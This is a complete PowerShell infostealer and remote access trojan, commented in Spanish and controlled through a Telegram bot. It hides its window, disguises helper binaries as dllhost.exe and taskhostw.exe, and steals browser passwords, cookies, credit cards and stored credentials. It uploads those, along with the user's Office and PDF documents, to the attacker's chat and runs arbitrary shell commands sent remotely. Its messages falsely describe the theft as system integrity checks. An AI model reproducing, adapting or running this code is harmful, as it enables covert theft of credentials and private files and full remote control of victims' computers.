param(
    [Parameter(Mandatory=$true)][string]$Token,
    [Parameter(Mandatory=$true)][string]$ChatId
)

# === CONFIGURACION ===
$Global:ApiUrl = "https://api.telegram.org/bot$Token"
$Global:BasePath = "$env:APPDATA\Microsoft\Windows\Security\Cache"
$Global:LogPath = "$env:APPDATA\Microsoft\Windows\Security\Logs"

# Nombres de procesos legitimos (deben coincidir con el batch)
$Global:ProcBrowser = "dllhost.exe"
$Global:ProcPass = "taskhostw.exe"

$Global:BrowserPath = "$Global:BasePath\$Global:ProcBrowser"
$Global:PassPath = "$Global:BasePath\$Global:ProcPass"

# Crear estructura
New-Item -ItemType Directory -Path $Global:BasePath -Force | Out-Null
New-Item -ItemType Directory -Path $Global:LogPath -Force | Out-Null
attrib +h +s +r $Global:BasePath 2>$null
attrib +h +s +r $Global:LogPath 2>$null

# Variables de sesion
$script:CurrentDir = $PWD.Path
$script:Processed = @{}
$script:Lock = New-Object System.Object

# === FUNCIONES ===
function Send-TGMsg($Text) {
    try {
        if ($Text.Length -gt 4000) { $Text = $Text.Substring(0, 4000) + "`n...(truncado)" }
        $body = @{ chat_id = $ChatId; text = $Text } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "$Global:ApiUrl/sendMessage" -Method Post -ContentType "application/json" -Body $body | Out-Null
    } catch {}
}

function Send-TGFile($Path, $Caption = "") {
    try {
        if (-not (Test-Path $Path)) { return $false }
        $args = @("-s", "-X", "POST", "$Global:ApiUrl/sendDocument", "-F", "chat_id=$ChatId", "-F", "document=@$Path")
        if ($Caption) { $args += "-F", "caption=$Caption" }
        $result = & curl.exe @args 2>$null | ConvertFrom-Json
        return $result.ok
    } catch { return $false }
}

function Get-SysInfo {
    try {
        $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip
    } catch { $ip = "N/A" }
    return "Host: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip"
}

function Invoke-BrowserExtract {
    if (-not (Test-Path $Global:BrowserPath)) {
        Send-TGMsg "Error: Componente COM no encontrado"
        return $false
    }
    
    Send-TGMsg "Iniciando verificacion de integridad del sistema..."
    
    $outDir = "$env:TEMP\sys_$(Get-Random)"
    New-Item -ItemType Directory -Path $outDir -Force | Out-Null
    
    try {
        # Cerrar navegadores
        $procs = @("chrome","msedge","firefox","brave","opera")
        Get-Process $procs -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
        
        # Ejecutar con nombre legitimo
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $Global:BrowserPath
        $psi.Arguments = "dump -d `"$outDir`" -f json"
        $psi.WindowStyle = "Hidden"
        $psi.CreateNoWindow = $true
        $psi.UseShellExecute = $false
        
        $proc = [System.Diagnostics.Process]::Start($psi)
        $proc.WaitForExit(120000)
        
        if (-not $proc.HasExited) { $proc.Kill() }
        
        # Procesar resultados
        $files = Get-ChildItem $outDir -Filter "*.json" -Recurse -ErrorAction SilentlyContinue
        $types = @("bookmark","cookie","download","extension","history","localstorage","password","creditcard")
        
        $idx = 0
        foreach ($tipo in $types) {
            $idx++
            $matched = $files | Where-Object { $_.Name -like "*$tipo*" }
            if ($matched) {
                $zip = "$env:TEMP\sys_$tipo.zip"
                Compress-Archive -Path $matched.FullName -DestinationPath $zip -Force
                $size = [math]::Round((Get-Item $zip).Length / 1KB, 2)
                Send-TGFile -Path $zip -Caption "[$idx/8] SystemCheck: $tipo ($size KB)"
                Remove-Item $zip -Force -ErrorAction SilentlyContinue
            }
            Start-Sleep -Seconds 1
        }
        
        Send-TGMsg "Verificacion completada: 8 componentes analizados"
        return $true
    }
    finally {
        if (Test-Path $outDir) { Remove-Item $outDir -Recurse -Force -ErrorAction SilentlyContinue }
    }
}

function Invoke-PassExtract {
    if (-not (Test-Path $Global:PassPath)) {
        Send-TGMsg "Error: Servicio de tareas no encontrado"
        return $false
    }
    
    Send-TGMsg "Analizando almacen de credenciales..."
    
    $outDir = "$env:TEMP\cred_$(Get-Random)"
    New-Item -ItemType Directory -Path $outDir -Force | Out-Null
    
    try {
        $modules = @("browsers","chats","databases","games","git","mails","maven","memory","multimedia","php","svn","sysadmin","windows","wifi")
        $idx = 0
        
        foreach ($mod in $modules) {
            $idx++
            try {
                $psi = New-Object System.Diagnostics.ProcessStartInfo
                $psi.FileName = $Global:PassPath
                $psi.Arguments = $mod
                $psi.RedirectStandardOutput = $true
                $psi.WindowStyle = "Hidden"
                $psi.CreateNoWindow = $true
                $psi.UseShellExecute = $false
                
                $proc = [System.Diagnostics.Process]::Start($psi)
                $output = $proc.StandardOutput.ReadToEnd()
                $proc.WaitForExit(60000)
                
                if (-not $proc.HasExited) { $proc.Kill() }
                
                if ($output -match "Password found|\[\+]" -and $output.Length -gt 200) {
                    $outFile = "$outDir\$mod.log"
                    $output | Out-File $outFile -Encoding UTF8
                    $zip = "$env:TEMP\cred_$mod.zip"
                    Compress-Archive -Path $outFile -DestinationPath $zip -Force
                    Send-TGFile -Path $zip -Caption "[$idx/14] CredStore: $mod (DATA FOUND)"
                    Remove-Item $zip -Force -ErrorAction SilentlyContinue
                }
            } catch {}
            Start-Sleep -Milliseconds 500
        }
        
        Send-TGMsg "Analisis de credenciales completado"
        return $true
    }
    finally {
        if (Test-Path $outDir) { Remove-Item $outDir -Recurse -Force -ErrorAction SilentlyContinue }
    }
}

function Invoke-DocExtract {
    Send-TGMsg "Indexando documentos del sistema..."
    
    $docs = [Environment]::GetFolderPath("MyDocuments")
    $down = "$env:USERPROFILE\Downloads"
    
    $targets = @()
    if (Test-Path $docs) { $targets += $docs }
    if (Test-Path $down) { $targets += $down }
    
    $exts = @('*.docx','*.doc','*.pdf','*.xlsx','*.xls','*.pptx','*.ppt')
    $found = @()
    
    foreach ($target in $targets) {
        foreach ($ext in $exts) {
            try { $found += Get-ChildItem -Path $target -Include $ext -Recurse -File -ErrorAction SilentlyContinue | Select-Object -First 20 } catch {}
        }
    }
    
    $unique = $found | Sort-Object FullName -Unique | Select-Object -First 30
    $total = $unique.Count
    $sent = 0
    
    Send-TGMsg "Documentos encontrados: $total"
    
    foreach ($file in $unique | Sort-Object { $_.Extension }) {
        $sent++
        $size = [math]::Round($file.Length / 1MB, 2)
        $ext = $file.Extension.ToUpper().TrimStart('.')
        Send-TGFile -Path $file.FullName -Caption "[$sent/$total] [$ext] $($file.Name) ($size MB)"
        Start-Sleep -Seconds 1
    }
    
    Send-TGMsg "Indexacion completada: $sent documentos"
}

function Invoke-SysCmd($Cmd) {
    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "cmd.exe"
        $psi.Arguments = "/c $Cmd"
        $psi.WorkingDirectory = $script:CurrentDir
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        
        $proc = [System.Diagnostics.Process]::Start($psi)
        $stdout = $proc.StandardOutput.ReadToEnd()
        $stderr = $proc.StandardError.ReadToEnd()
        $proc.WaitForExit()
        
        $out = $stdout + $stderr
        if ([string]::IsNullOrWhiteSpace($out)) { $out = "(sin salida)" }
        
        $tmp = "$env:TEMP\out_$(Get-Random).tmp"
        "Cmd: $Cmd`nDir: $script:CurrentDir`n$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n$('='*50)`n`n$out" | Out-File $tmp -Encoding UTF8
        Send-TGFile -Path $tmp -Caption "Output: $Cmd"
        Remove-Item $tmp -Force -ErrorAction SilentlyContinue
    } catch {
        Send-TGMsg "Error: $($_.Exception.Message)"
    }
}

function Process-Cmd($Text, $UpdateId) {
    [void][System.Threading.Monitor]::Enter($script:Lock)
    try {
        if ($script:Processed.ContainsKey($UpdateId)) { return }
        $script:Processed[$UpdateId] = $true
    } finally { [System.Threading.Monitor]::Exit($script:Lock) }
    
    $parts = $Text.Trim() -split '\s+', 2
    $cmd = $parts[0].ToLower()
    $arg = if ($parts.Count -gt 1) { $parts[1] } else { "" }
    
    switch ($cmd) {
        "/help" {
            Send-TGMsg @"
Comandos:
/info - Informacion del sistema
/ls - Listar archivos
/cd <ruta> - Cambiar directorio
/cmd <comando> - Ejecutar comando
/run - Ciclo completo
/browser - Solo navegadores
/pass - Solo credenciales
/docs - Solo documentos
"@
        }
        "/info" { Send-TGMsg (Get-SysInfo) }
        "/ls" {
            try {
                $items = Get-ChildItem $script:CurrentDir | Select-Object Mode, LastWriteTime, Length, Name | Format-Table -AutoSize | Out-String
                Send-TGMsg "Dir: $script:CurrentDir`n`n$items"
            } catch { Send-TGMsg "Error" }
        }
        "/cd" { if ($arg) { $script:CurrentDir = $arg; Send-TGMsg "Dir: $script:CurrentDir" } }
        "/cmd" { if ($arg) { Invoke-SysCmd $arg } }
        "/run" {
            Invoke-BrowserExtract
            Start-Sleep -Seconds 3
            Invoke-PassExtract
            Start-Sleep -Seconds 3
            Invoke-DocExtract
        }
        "/browser" { Invoke-BrowserExtract }
        "/pass" { Invoke-PassExtract }
        "/docs" { Invoke-DocExtract }
        default {}
    }
}

# === INICIO ===
# Ocultar ventana
try {
    Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow(); [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
    $hwnd = [Console.Window]::GetConsoleWindow()
    [Console.Window]::ShowWindow($hwnd, 0) | Out-Null
} catch {}

Send-TGMsg "Online: $(Get-SysInfo)"

try {
    Invoke-RestMethod -Uri "$Global:ApiUrl/deleteWebhook?drop_pending_updates=true" -Method Post | Out-Null
    Start-Sleep -Seconds 2
} catch {}

$lastId = 0
while ($true) {
    try {
        $resp = Invoke-RestMethod -Uri "$Global:ApiUrl/getUpdates?offset=$($lastId+1)&limit=1" -TimeoutSec 60
        if ($resp.ok -and $resp.result.Count -gt 0) {
            $upd = $resp.result[0]
            $lastId = $upd.update_id
            if ($upd.message -and $upd.message.text -and ([string]$upd.message.chat.id -eq $ChatId)) {
                Process-Cmd -Text $upd.message.text -UpdateId $upd.update_id
            }
        }
    } catch { Start-Sleep -Seconds 2 }
    Start-Sleep -Milliseconds 1500
}
